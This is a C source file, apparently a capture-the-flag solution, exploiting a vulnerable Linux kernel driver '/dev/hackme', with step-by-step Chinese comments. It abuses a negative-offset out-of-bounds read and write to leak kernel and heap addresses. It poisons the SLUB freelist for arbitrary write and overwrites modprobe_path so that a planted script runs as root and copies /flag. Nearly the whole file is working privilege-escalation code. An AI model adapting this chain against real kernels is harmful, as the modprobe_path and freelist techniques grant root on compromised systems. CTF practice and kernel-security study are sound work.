#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/wait.h>
struct arg{
	size_t idx;
	void * user;
	long long size;
	long long offset; //offset可以是负数，导致可以下溢读和写
};

struct arg cmd;

void alloc(int fd,int idx,void *user,long long size)
{	
	cmd.idx = idx;
	cmd.user = user;
	cmd.size = size;
	ioctl(fd,0x30000,&cmd);	
}
void delete(int fd,int idx)
{	
	cmd.idx = idx;
	ioctl(fd,0x30001,&cmd);	
}
void read_0(int fd,int idx,void *user,long long size,long long offset)
{	
	cmd.idx = idx;
	cmd.user = user;
	cmd.size = size;
	cmd.offset = offset;
	ioctl(fd,0x30003,&cmd);	
}
void write_0(int fd,int idx,void *user,long long size,long long offset)
{	
	cmd.idx = idx;
	cmd.user = user;
	cmd.size = size;
	cmd.offset = offset;
	ioctl(fd,0x30002,&cmd);	
}

int main()
{
	int fd = open("/dev/hackme",0);
	unsigned long long heap_addr, kernel_addr,mod_addr,pool_addr,modprobe_path;
	if(fd == -1)
	{	
		error("[-] Failed to open hackme device");
	}
	char *pBuffer = malloc(0x1000);
	memset(pBuffer,'A',0x100);
	alloc(fd,0,pBuffer,0x100);
	alloc(fd,1,pBuffer,0x100);
	alloc(fd,2,pBuffer,0x100);
	alloc(fd,3,pBuffer,0x100);
	alloc(fd,4,pBuffer,0x100);
	
	delete(fd,1); 
	delete(fd,3);//slub分配类似fastbin，先进后出，chunk 3的fd填入chunk1的地址

	read_0(fd,4,pBuffer,0x100,-0x100);//获取chunk1的地址
	heap_addr = *(size_t *)pBuffer;
	printf("[+]leak_heap_addr:%llx\n",*(size_t *)pBuffer);	

	read_0(fd,0,pBuffer,0x200,-0x200);//获取chunk 0上面可能存在的内核地址	
	kernel_addr = *(size_t *)(pBuffer+0x28);
	printf("[+]leak_kernel_addr:%llx\n",*(size_t *)(pBuffer+0x28));	 //固定函数sysctl_table_root的地址
	
	kernel_addr = kernel_addr - 0x849ae0;//获得kernel的基地址
	printf("[+]leak_kernel_base:%16llx\n",kernel_addr);	
	
	mod_addr = kernel_addr + 0x811040; //搜索找到一块存有pool地址附近的内存 find 0xffffffff81c00000
	*(size_t *)pBuffer = mod_addr;
	write_0(fd,4,pBuffer,0x100,-0x100); //填充chunk 3 的fd为上述的内存地址
	
	alloc(fd,5,pBuffer,0x100); // 获得原先chunk 3的块，此时chunk 3 的fd已改
	alloc(fd,6,pBuffer,0x100); // fastbin attack，获得存有pool地址的内存
	
	read_0(fd,6,pBuffer,0x40,-0x40);	// 读取pool的地址
	pool_addr = *(size_t *)(pBuffer+0x18);
	printf("[+]leak_pool_addr:%16llx\n",pool_addr);	

	delete(fd,2); // 释放chunk 2
	delete(fd,5); // 释放原先chunk 3的地址
	
	*(size_t *)pBuffer = pool_addr+0x2400+0xc0; 
	write_0(fd,4,pBuffer,0x100,-0x100); //覆写原先chunk 3的fd为后续要填写的地址 &pool[0xc]
	alloc(fd,7,pBuffer,0x100);  // 获得原先chunk 3 此时chunk 3 的fd已改
	alloc(fd,8,pBuffer,0x100);  // fastbin attack，获得后续要填写的地址 &pool[0xc]

	modprobe_path = kernel_addr + 0x83f960;	
	*(size_t *)pBuffer = modprobe_path;
	*(size_t *)(pBuffer+8) = 0x100; // 伪造大小，因为有offset + size <= (unsigned __int64)v9[1]的判断，否则无需上面泄露pool地址，直接fastbin attack修改modprobe_path
	write_0(fd,8,pBuffer,0x100,0); //将modprobe_path地址填入pool[0xc]

	
	strncpy(pBuffer,"/home/pwn/copy.sh\0",18);
	write_0(fd,0xc,pBuffer,18,0);//将modprobe_path的路径名替换成要执行的脚本			
	
	system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh");
	system("chmod +x /home/pwn/copy.sh");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/dummy");//执行错误的二进制文件，会调用moprobe,执行modprobe_path上的文件"/sbin/modprobe"，将路径名替换成要执行的脚本，并且该函数具有root权限
	system("chmod +x /home/pwn/dummy");

	system("/home/pwn/dummy");
	system("cat flag");
	close(fd);
	return 0;
}

